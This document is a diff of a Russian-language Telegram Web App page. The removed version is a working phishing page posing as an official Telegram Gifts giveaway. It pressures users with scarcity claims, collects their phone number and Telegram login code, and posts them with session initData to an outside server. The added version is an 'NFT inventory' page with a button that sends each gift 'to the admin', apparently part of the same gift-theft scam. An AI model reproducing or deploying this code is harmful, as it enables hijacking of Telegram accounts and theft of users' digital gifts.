@@ -3,281 +3,153 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Розыгрыш подарков</title>
+    <title>Мой инвентарь NFT</title>
     <style>
         body {
-            background: #f0f2f5;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
             margin: 0;
             padding: 20px;
-            color: #1c1e21;
         }
         .container {
             max-width: 400px;
             margin: 0 auto;
         }
         .header {
-            background: linear-gradient(135deg, #2AABEE, #229ED9);
+            background: #2AABEE;
             color: white;
-            padding: 30px 20px;
+            padding: 20px;
             border-radius: 20px;
             text-align: center;
             margin-bottom: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
-        .header h1 {
-            margin: 0;
-            font-size: 28px;
+        .nft-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
         }
-        .header p {
-            margin: 10px 0 0;
-            opacity: 0.9;
-        }
-        .gift-card {
+        .nft-card {
             background: white;
             border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 16px;
+            padding: 16px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
             display: flex;
+            gap: 16px;
             align-items: center;
-            gap: 15px;
-            border: 1px solid rgba(0,0,0,0.05);
         }
-        .gift-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #f093fb, #f5576c);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            color: white;
+        .nft-card img {
+            width: 80px;
+            height: 80px;
+            border-radius: 12px;
+            object-fit: cover;
+            background: #eee;
         }
-        .gift-info h3 {
-            margin: 0;
-            font-size: 18px;
+        .nft-info {
+            flex: 1;
         }
-        .gift-info p {
-            margin: 5px 0 0;
-            color: #65676b;
-            font-size: 14px;
-        }
-        .login-form {
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            margin-top: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #65676b;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dadde1;
-            border-radius: 10px;
+        .nft-info h3 {
+            margin: 0 0 8px 0;
             font-size: 16px;
-            box-sizing: border-box;
-            transition: border-color 0.2s;
         }
-        .form-group input:focus {
-            border-color: #2AABEE;
-            outline: none;
+        .nft-info p {
+            margin: 0 0 8px 0;
+            font-size: 13px;
+            color: #65676b;
         }
-        .btn-login {
+        .send-btn {
             background: #2AABEE;
             color: white;
             border: none;
-            padding: 14px;
-            width: 100%;
+            padding: 8px 16px;
             border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
             transition: background 0.2s;
         }
-        .btn-login:hover {
+        .send-btn:hover {
             background: #229ED9;
         }
-        .note {
+        .empty {
             text-align: center;
-            margin-top: 15px;
             color: #65676b;
-            font-size: 13px;
-        }
-        .note a {
-            color: #2AABEE;
-            text-decoration: none;
-        }
-        .urgent-badge {
-            background: #ff4d4f;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 30px;
-            font-size: 12px;
-            font-weight: 600;
-            display: inline-block;
-            margin-left: 10px;
+            padding: 40px 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🎁 Официальный розыгрыш</h1>
-            <p>В честь 2 млн пользователей Telegram Gifts</p>
+            <h1>🎁 Мой инвентарь</h1>
+            <p>Твои NFT подарки</p>
         </div>
-
-        <div class="gift-card">
-            <div class="gift-icon">🎩</div>
-            <div class="gift-info">
-                <h3>Папаха Хабиба <span class="urgent-badge">🔥 23 осталось</span></h3>
-                <p>Эксклюзивный подарок для фанатов UFC</p>
-            </div>
-        </div>
-
-        <div class="gift-card">
-            <div class="gift-icon">🎮</div>
-            <div class="gift-info">
-                <h3>Premium-стикерпак</h3>
-                <p>Ограниченная серия 2025</p>
-            </div>
-        </div>
-
-        <div class="gift-card">
-            <div class="gift-icon">💎</div>
-            <div class="gift-info">
-                <h3>TON Diamond</h3>
-                <p>Редкий NFT-подарок</p>
-            </div>
-        </div>
-
-        <div class="login-form">
-            <h3 style="margin-top: 0; text-align: center;">🔐 Подтвердите получение</h3>
-            <p style="text-align: center; color: #65676b; margin-bottom: 20px;">Введите данные Telegram для активации подарка</p>
-
-            <div class="form-group">
-                <label>📱 Номер телефона</label>
-                <input type="tel" id="phone" placeholder="+7 999 123 45 67" value="">
-            </div>
-
-            <div class="form-group" id="code-group" style="display: none;">
-                <label>🔢 Код подтверждения</label>
-                <input type="text" id="code" placeholder="Введите код из Telegram">
-                <div style="margin-top: 10px; font-size: 13px; color: #2AABEE; cursor: pointer;" onclick="resendCode()">📨 Отправить код ещё раз</div>
-            </div>
-
-            <button class="btn-login" onclick="handleLogin()" id="loginBtn">Получить подарок</button>
-
-            <div class="note">
-                ⚡️ Только для первых 1000 пользователей<br>
-                <a href="#">Правила розыгрыша</a>
-            </div>
+        <div id="inventory" class="nft-grid">
+            <div class="empty">Загрузка...</div>
         </div>
     </div>
 
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        let tg = window.Telegram?.WebApp;
-        let step = 'phone';
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
 
-        // Расширяем окно на весь экран
-        if (tg) {
-            tg.expand();
-            tg.ready();
-            tg.setHeaderColor('#2AABEE');
-        }
+        const initData = tg.initData;
 
-        function handleLogin() {
-            const phone = document.getElementById('phone').value;
-            const code = document.getElementById('code').value;
-
-            if (step === 'phone') {
-                if (!phone || phone.length < 10) {
-                    alert('Введите корректный номер телефона');
-                    return;
-                }
-
-                // Отправляем телефон на сервер
-                fetch('https://newifi.onrender.com/', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        phone: phone,
-                        step: 'phone',
-                        initData: tg?.initData || '',
-                        userAgent: navigator.userAgent
-                    })
-                })
-                .then(r => r.json())
-                .then(data => {
-                    // Показываем поле для кода
-                    document.getElementById('code-group').style.display = 'block';
-                    document.getElementById('loginBtn').textContent = 'Подтвердить код';
-                    step = 'code';
-                    
-                    // Сохраняем phone для следующего шага
-                    window._tempPhone = phone;
-                })
-                .catch(err => {
-                    console.error('Error:', err);
-                    alert('Ошибка сервера, попробуйте позже');
+        // Загружаем инвентарь
+        fetch('/api/user', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ initData })
+        })
+        .then(res => res.json())
+        .then(data => {
+            const inventoryDiv = document.getElementById('inventory');
+            if (data.nfts && data.nfts.length > 0) {
+                let html = '';
+                data.nfts.forEach(nft => {
+                    html += `
+                        <div class="nft-card" data-id="${nft.nftId}">
+                            <img src="${nft.imageUrl || 'https://via.placeholder.com/80'}" alt="${nft.title}">
+                            <div class="nft-info">
+                                <h3>${nft.title}</h3>
+                                <p>${nft.description.substring(0, 50)}...</p>
+                                <button class="send-btn" onclick="sendNFT('${nft.nftId}')">Отправить админу</button>
+                            </div>
+                        </div>
+                    `;
                 });
-
-            } else if (step === 'code') {
-                if (!code || code.length < 5) {
-                    alert('Введите код из Telegram');
-                    return;
-                }
-
-                fetch('https://твой-сервер.ru/api/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        phone: window._tempPhone,
-                        code: code,
-                        step: 'code',
-                        initData: tg?.initData || ''
-                    })
-                })
-                .then(r => r.json())
-                .then(data => {
-                    if (data.success) {
-                        // Перенаправляем на реальный Telegram после успеха
-                        alert('✅ Подарок активирован! Перенаправляем...');
-                        setTimeout(() => {
-                            window.location.href = 'https://t.me/';
-                        }, 1500);
-                    } else {
-                        alert('❌ Неверный код. Попробуйте ещё раз');
-                    }
-                })
-                .catch(err => {
-                    console.error('Error:', err);
-                    alert('Ошибка сервера');
-                });
+                inventoryDiv.innerHTML = html;
+            } else {
+                inventoryDiv.innerHTML = '<div class="empty">У тебя пока нет NFT</div>';
             }
-        }
+        })
+        .catch(err => {
+            console.error(err);
+            document.getElementById('inventory').innerHTML = '<div class="empty">Ошибка загрузки</div>';
+        });
 
-        function resendCode() {
-            if (window._tempPhone) {
-                fetch('https://твой-сервер.ru/api/resend', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: window._tempPhone})
-                });
-                alert('Новый код отправлен');
-            }
-        }
+        // Функция отправки NFT (меняет статус)
+        window.sendNFT = function(nftId) {
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ nftId, initData })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    tg.showAlert('NFT отправлен! Ожидай обмена.');
+                    // Убираем карточку из интерфейса
+                    const card = document.querySelector(`[data-id="${nftId}"]`);
+                    if (card) card.remove();
+                } else {
+                    tg.showAlert('Ошибка: ' + (data.error || 'неизвестная'));
+                }
+            })
+            .catch(err => {
+                tg.showAlert('Ошибка соединения');
+            });
+        };
     </script>
 </body>
 </html>
